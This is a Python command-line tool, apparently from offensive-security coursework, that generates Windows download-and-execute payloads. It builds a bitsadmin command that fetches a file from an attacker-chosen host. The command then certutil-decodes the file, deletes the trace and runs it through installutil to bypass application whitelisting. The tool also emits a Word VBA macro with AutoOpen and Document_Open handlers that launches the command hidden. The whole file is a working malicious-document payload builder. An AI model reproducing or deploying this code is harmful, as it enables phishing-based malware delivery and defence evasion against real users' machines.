import argparse

def banner():
    banner="""
 ______ __ __                  __            __         
|   __ \__|  |_.-----.---.-.--|  |.--------.|__|.-----. 
|   __ <  |   _|__ --|  _  |  _  ||        ||  ||     | 
|______/__|____|_____|___._|_____||__|__|__||__||__|__| 
 ______               __                 __      _______                                __              
|   __ \.---.-.--.--.|  |.-----.---.-.--|  |    |     __|.-----.-----.-----.----.---.-.|  |_.-----.----.
|    __/|  _  |  |  ||  ||  _  |  _  |  _  |    |    |  ||  -__|     |  -__|   _|  _  ||   _|  _  |   _|
|___|   |___._|___  ||__||_____|___._|_____|    |_______||_____|__|__|_____|__| |___._||____|_____|__|  
              |_____|                                                                            
 
    Created by eMVee

    """
    print("\033[31m" + banner + "\033[0m")                                                        
    
def generate_command(host, port, jobname, file_name, download_location, downloaded_file_name, executable_name, executable_location):
    """
    Generates a command as a text file and displays it on the console.

    Args:
        host (str): IP address of the host.
        port (str): Port of the host.
        jobname (str): Job name for bitsadmin.
        file_name (str): Name of the file to be downloaded from the host.
        download_location (str): Location on the download machine.
        downloaded_file_name (str): Name of the file when downloaded.
        executable_name (str): Name of the executable.

    Returns:
        None
    """

    # Construct the URL
    if port == "80":
        url = f"http://{host}/{file_name}"
    else:
        url = f"http://{host}:{port}/{file_name}"

    # Construct the command    
    # bitsadmin /Transfer myJob http://192.168.45.207/file.txt C:\users\student\def.txt && certutil -decode C:\users\student\def.txt C:\users\student\Bypass.exe && del C:\users\student\def.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
    command = f"bitsadmin /Transfer {jobname} {url} {download_location}\\{downloaded_file_name} && "
    command += f"certutil -decode {download_location}\\{downloaded_file_name} {download_location}\\{executable_location} && "
    command += f"del {download_location}\\{downloaded_file_name} && "
    command += f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U {download_location}\\{executable_location}"

    #Construct the VBA Macro
    macro = f'''
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd /c {command}"
    Shell str, vbHide
End Sub
    '''

    # Display the command on the console
    print("\033[92m[+] Generated Command:\033[0m")
    print(command)

    # Display the VBA macro on the console
    print("\033[92m[+] Generated VBA macro for a MS Word document:\033[0m")
    print(macro)


    # Save the VBA macro to a text file
    with open("VBA-macro.txt", "w") as file:
        file.write(macro)

    print("\033[92m[+] VBA macro saved to VBA-macro.txt so it can be copied and pasted in a MS Word document")

def main():
    banner()
    parser = argparse.ArgumentParser(description="Generates a command to download and execute a file.")
    parser.add_argument("-i", "--ip", help="IP address of the host", required=True)
    parser.add_argument("-p", "--port", help="Port of the host", default="80")
    parser.add_argument("-j", "--jobname", help="Jobname for bitsadmin", required=True, default="myJob")
    parser.add_argument("-f", "--file", help="Name of the file to be downloaded from the host", required=True)
    parser.add_argument("-l", "--location", help="Location on the download machine", required=True)
    parser.add_argument("-o", "--output", help="Name of the file when downloaded", required=True)
    parser.add_argument("-exe", "--executable", help="Name of the executable", required=True)

    args = parser.parse_args()

    generate_command(args.ip, args.port, args.jobname, args.file, args.location, args.output, args.output, args.executable)

if __name__ == "__main__":
    main()
